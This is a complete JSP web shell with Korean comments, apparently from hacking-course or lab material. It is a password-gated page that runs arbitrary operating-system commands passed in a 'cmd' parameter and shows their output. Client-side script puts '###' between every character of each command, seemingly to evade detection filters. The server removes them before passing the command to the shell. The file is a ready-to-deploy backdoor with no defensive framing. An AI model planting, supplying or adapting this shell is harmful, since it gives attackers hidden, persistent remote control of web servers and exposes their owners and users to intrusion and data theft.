<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@page import="java.io.*" %>
<%@page import="java.lang.*" %>

<%
  // 사용자로부터 'cmd' 파라미터를 받아옵니다.
  String cmd = request.getParameter("cmd");

  Process ps = null;
  BufferedReader br = null;
  String line = "";
  String result = "";
  // 인증 기능을 위한 패스워드 변수 생성
  String real_password = "crehacktive";
  String input_password = request.getParameter("password");
  String id = (String)session.getAttribute("webshell_id");

  // 현재 페이지의 경로를 가져옵니다.
  String now_page = request.getServletPath();

  //OS 환경에 따라 실행
  String os = System.getProperty("os.name").toLowerCase();
  String shell = "";

  try {
    // 세션 ID가 없고 입력된 비밀번호가 없는 경우 로그인 폼을 표시합니다.
    if(id == null && input_password == null) {
%>
<form action="<%=now_page%>" method="post">
  <input type="password" name="password">
  <input type="submit" value="AUTH">
</form>
<%
      return;
      // 세션 ID가 없고 입력된 비밀번호가 있는 경우 비밀번호를 검증합니다.
    } else if(id==null && input_password != null ) {
      if(input_password.equals(real_password)){
        // 비밀번호가 일치하면 세션에 ID를 저장하고 현재 페이지로 리다이렉트합니다.
        session.setAttribute("webshell_id", "crehacktive");
        response.sendRedirect(now_page);
      }
      else {
        // 비밀번호가 일치하지 않으면 현재 페이지로 리다이렉트합니다.
        response.sendRedirect(now_page);
      }
    }

    if(os.indexOf("win") == -1) { // Windows 가 아닐 경우
      shell = "/bin/sh -c";
    } else{ shell = "cmd.exe /c"; } // Windows 일 경우


    // cmd 파라미터가 null이 아닐 경우에만 실행
    if (cmd != null) {
      cmd = cmd.replace("###", "");
      ps = Runtime.getRuntime().exec(shell + cmd);

      // 명령어 실행 결과를 읽기 위한 BufferedReader를 생성합니다.
      br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

      // 결과를 한 줄씩 읽어 HTML <br> 태그와 함께 result 문자열에 추가합니다.
      while ((line = br.readLine()) != null) {
        result += line + "<br>";
      }
      // 프로세스를 종료합니다.
      ps.destroy();
    }

  } finally {
    if (br != null) br.close();
  }
%>
<script>
  // 엔터 키(keyCode:13) 누르면 명령어 실행하게 해주는 이벤트 리스너야.
  // 이렇게 하면 사용자가 입력 필드에서 엔터 키를 누를 때마다 명령어가 자동으로 실행돼.
  // 편의성을 위해 추가
  document.addEventListener("keydown", (event)=>{if(event.keyCode === 13){cmdRequest()}});

  function cmdRequest() {
    var frm = document.frm; //frm'이라는 이름의 폼을 찾아서 변수에 저장해.
    var cmd = frm.cmd.value; //사용자가 입력한 'name="cmd"'인 입력 필드의 값을 가져온다.
    var enc_cmd = "";

    // 명령어를 문자 단위로 쪼개서 "###"을 사이에 넣어.
    // 이거 서버에서 다시 원래대로 만들 거야.
    for(i=0; i<cmd.length; i++) {
      enc_cmd += cmd.charAt(i) + "###";
    }
    // 인코딩된 명령어를 폼의 cmd 필드에 다시 설정해.
    // 이렇게 하면 서버로 전송될 때 인코딩된 형태로 가게 돼.
    frm.cmd.value = enc_cmd;

    // 폼의 action 속성을 현재 페이지 URL로 설정만 하고, frm.submit()으로 보낸다.
    // 새로운 명령어 실행: 매번 폼을 제출할 때마다 새로운 cmd 값을 서버로 보내. 이전 명령어는 유지되지 않아
    frm.action = "<%=now_page%>" ;
    // 폼을 제출해서 서버로 명령어를 보내.
    frm.submit();
  }
</script>

<form name="frm" method="POST">
  <input type="text" name="cmd">
  <input type="button" onClick="cmdRequest();" value="EXECUTE">
</form>

<hr>
<!-- 명령어 실행 결과를 출력합니다. -->
<%=result%>
